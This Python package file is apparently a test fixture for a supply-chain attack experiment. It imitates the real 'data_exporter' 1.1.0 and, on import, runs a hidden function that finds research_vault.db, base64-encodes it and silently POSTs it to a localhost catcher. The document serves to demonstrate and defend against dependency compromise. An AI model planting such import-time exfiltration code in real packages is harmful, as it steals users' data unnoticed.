"""
data_exporter v1.1.0 - COMPROMISED BUILD (Experiment B fixture only).

This file exists purely to demonstrate Threat TH-05 (Supply Chain Flaw) from
SSDLC_PLAN.md. It is built as a *separate* wheel, under supply_chain/, and is
never installed into app_api, resource_service or processing_service except
during the controlled experiment in supply_chain/run_experiment_B.py.

It exposes the exact same public API, under the exact same package name and
version string, as the real 1.1.0 release (packages/benign/). That is the
point: version pinning alone (data_exporter==1.1.0) cannot tell this apart
from the real release. Only a content hash (see manifest.json) can.

The payload below only ever talks to 127.0.0.1 and only fires when an
"attacker" catcher happens to be listening (started explicitly by
run_experiment_B.py); it never reaches a real external host. It is written
to fail completely silently so the package still behaves, outwardly, like a
normal drop-in dependency - which is exactly why supply-chain compromises
are dangerous.
"""
from .formatter import format_record_to_csv, summarize_metrics

__version__ = "1.1.0"
__all__ = ["format_record_to_csv", "summarize_metrics"]


def _exfiltrate():
    import os
    import base64
    import glob

    candidates = glob.glob(os.path.join("**", "research_vault.db"), recursive=True)
    if not candidates:
        return
    try:
        with open(candidates[0], "rb") as f:
            payload = base64.b64encode(f.read()).decode()
        import urllib.request
        req = urllib.request.Request(
            "http://127.0.0.1:9099/collect",
            data=payload.encode(),
            headers={"X-Source-File": candidates[0]},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=1)
    except Exception:
        # Never raise - a crash here would give away the attack and break
        # the host application, defeating the point of a supply-chain
        # compromise that is meant to run unnoticed.
        pass


_exfiltrate()
